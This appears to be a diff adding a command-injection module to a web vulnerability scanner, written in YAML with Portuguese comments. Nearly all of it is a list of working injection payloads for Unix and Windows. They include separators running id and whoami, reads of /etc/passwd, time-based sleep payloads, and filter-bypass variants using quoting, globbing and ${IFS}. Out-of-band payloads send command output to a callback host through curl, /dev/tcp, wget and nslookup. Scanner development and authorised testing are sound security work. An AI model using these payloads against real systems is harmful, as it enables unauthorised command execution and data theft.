@@ -1,0 +1,118 @@
+name: cmdi
+description: OS Command Injection (evidência direta, aritmética, time-based e OOB)
+detectors: [signature, time, oob, diff]
+diff_len_ratio: 0.50
+time_margin: 1.8
+
+transforms:
+  - ifs                 # espaços -> ${IFS}, $IFS$9, %09 ...
+  - newline_prefix      # prefixo %0a / %0d%0a / \n
+  - url
+  - case_random
+
+# id/uname/dir + resultado aritmético único (31337*1337 = 41897569) que só
+# aparece se o comando REALMENTE executou (não é reflexão do payload)
+signatures:
+  - 'uid=\d+\([a-z0-9_]+\)\s+gid=\d+'
+  - 'gid=\d+\([a-z0-9_]+\)'
+  - 'Linux [\w.-]+ \d+\.\d+'
+  - 'root:.*:0:0:'
+  - '41897569'
+  - 'Volume Serial Number'
+  - 'Directory of '
+  - 'Windows IP Configuration'
+  - '<DIR>'
+  - '\\Windows\\system32'
+
+payloads:
+  # --- evidência direta via id/uname (Unix) ---
+  - { value: ';id', tags: [unix] }
+  - { value: '|id', tags: [unix] }
+  - { value: '||id', tags: [unix] }
+  - { value: '&&id', tags: [unix] }
+  - { value: '; id', tags: [unix] }
+  - { value: '| id', tags: [unix] }
+  - { value: '$(id)', tags: [unix, subshell] }
+  - { value: '`id`', tags: [unix, subshell] }
+  - { value: ';uname -a', tags: [unix] }
+  - { value: '%0aid', tags: [unix, newline] }
+  - { value: "\nid", tags: [unix, newline] }
+  # --- aritmética (evita FP de reflexão: resultado != payload) ---
+  - { value: ';echo $((31337*1337))', tags: [unix, calc] }
+  - { value: '|echo $((31337*1337))', tags: [unix, calc] }
+  - { value: '$(expr 31337 \* 1337)', tags: [unix, calc] }
+  - { value: '`expr 31337 \* 1337`', tags: [unix, calc] }
+  - { value: ';expr 31337 \* 1337', tags: [unix, calc] }
+  # --- Windows ---
+  - { value: '&whoami', tags: [windows] }
+  - { value: '|whoami', tags: [windows] }
+  - { value: '&&whoami', tags: [windows] }
+  - { value: '&dir', tags: [windows] }
+  - { value: '|dir', tags: [windows] }
+  - { value: '&ipconfig', tags: [windows] }
+  - { value: '&set /a 31337*1337', tags: [windows, calc] }
+  # --- time-based (blind), delay=5 ---
+  - { value: ';sleep 5', tags: [unix, blind], delay: 5 }
+  - { value: '|sleep 5', tags: [unix, blind], delay: 5 }
+  - { value: '||sleep 5', tags: [unix, blind], delay: 5 }
+  - { value: '&&sleep 5', tags: [unix, blind], delay: 5 }
+  - { value: '$(sleep 5)', tags: [unix, blind], delay: 5 }
+  - { value: '`sleep 5`', tags: [unix, blind], delay: 5 }
+  - { value: ';ping -c 6 127.0.0.1', tags: [unix, blind], delay: 5 }
+  - { value: '&ping -n 6 127.0.0.1', tags: [windows, blind], delay: 5 }
+  - { value: '&timeout /t 5', tags: [windows, blind], delay: 5 }
+  - { value: '|powershell -c Start-Sleep 5', tags: [windows, blind], delay: 5 }
+  # --- OOB (exfiltra via callback controlado) ---
+  - { value: ';curl {OOBURL}', tags: [unix, oob], oob: true }
+  - { value: ';wget -q -O- {OOBURL}', tags: [unix, oob], oob: true }
+  - { value: '$(curl {OOBURL})', tags: [unix, oob], oob: true }
+  - { value: '`curl {OOBURL}`', tags: [unix, oob], oob: true }
+  - { value: ';nslookup {OOBFQDN}', tags: [unix, oob, dns], oob: true }
+  - { value: '|nslookup {OOBFQDN}', tags: [windows, oob, dns], oob: true }
+  - { value: '&certutil -urlcache -split -f {OOBURL}', tags: [windows, oob], oob: true }
+  - { value: '&powershell -c "Invoke-WebRequest {OOBURL}"', tags: [windows, oob], oob: true }
+  # --- separadores/encadeamentos extras ---
+  - { value: "%0a id", tags: [unix, newline] }
+  - { value: "%0d%0aid", tags: [unix, newline] }
+  - { value: "\n/bin/id", tags: [unix, newline] }
+  - { value: ";${IFS}id", tags: [unix, ifs] }
+  - { value: ";cat${IFS}/etc/passwd", tags: [unix, ifs] }
+  - { value: "|cat /etc/passwd", tags: [unix] }
+  - { value: "%26%26id", tags: [unix, encoded] }
+  - { value: "%3bid", tags: [unix, encoded] }
+  - { value: "%7cid", tags: [unix, encoded] }
+  - { value: "'`id`'", tags: [unix, subshell, quote] }
+  - { value: "\"`id`\"", tags: [unix, subshell, quote] }
+  - { value: "$(printf id)", tags: [unix, subshell] }
+  - { value: ";/???/??t /???/p??s??", tags: [unix, glob, bypass] }
+  - { value: ";c'a't /e't'c/pa's'swd", tags: [unix, quote, bypass] }
+  - { value: ";c\\at /et\\c/pa\\sswd", tags: [unix, backslash, bypass] }
+  - { value: ";cat$IFS$9/etc/passwd", tags: [unix, ifs] }
+  - { value: ";cat</etc/passwd", tags: [unix, redirect] }
+  - { value: ";rev</etc/passwd", tags: [unix, redirect] }
+  # --- aritmética extra (resultado único) ---
+  - { value: "|expr 31337 \\* 1337", tags: [unix, calc] }
+  - { value: "&&echo $((31337*1337))", tags: [unix, calc] }
+  - { value: "$((31337*1337))", tags: [unix, calc, inline] }
+  # --- Windows extras ---
+  - { value: "&type C:\\windows\\win.ini", tags: [windows] }
+  - { value: "|type %SYSTEMROOT%\\win.ini", tags: [windows] }
+  - { value: "&net user", tags: [windows] }
+  - { value: "&systeminfo", tags: [windows] }
+  - { value: "&hostname", tags: [windows] }
+  - { value: "&&whoami /priv", tags: [windows] }
+  - { value: "%26whoami", tags: [windows, encoded] }
+  # --- time-based extras ---
+  - { value: ";sleep 5;", tags: [unix, blind], delay: 5 }
+  - { value: "|sleep 5 #", tags: [unix, blind], delay: 5 }
+  - { value: "$(sleep 5)$(sleep 0)", tags: [unix, blind], delay: 5 }
+  - { value: "%0asleep 5", tags: [unix, blind, newline], delay: 5 }
+  - { value: "&ping -n 6 localhost", tags: [windows, blind], delay: 5 }
+  - { value: "|perl -e 'sleep 5'", tags: [unix, blind], delay: 5 }
+  - { value: "|python3 -c \"import time;time.sleep(5)\"", tags: [unix, blind], delay: 5 }
+  # --- OOB extras ---
+  - { value: ";id|curl -d @- {OOBURL}", tags: [unix, oob, exfil], oob: true }
+  - { value: "$(id>/dev/tcp/{OOBFQDN}/80)", tags: [unix, oob], oob: true }
+  - { value: ";wget {OOBURL}/$(whoami)", tags: [unix, oob], oob: true }
+  - { value: ";ping -c1 $(whoami).{OOBFQDN}", tags: [unix, oob, dns], oob: true }
+  - { value: "&nslookup %USERNAME%.{OOBFQDN}", tags: [windows, oob, dns], oob: true }
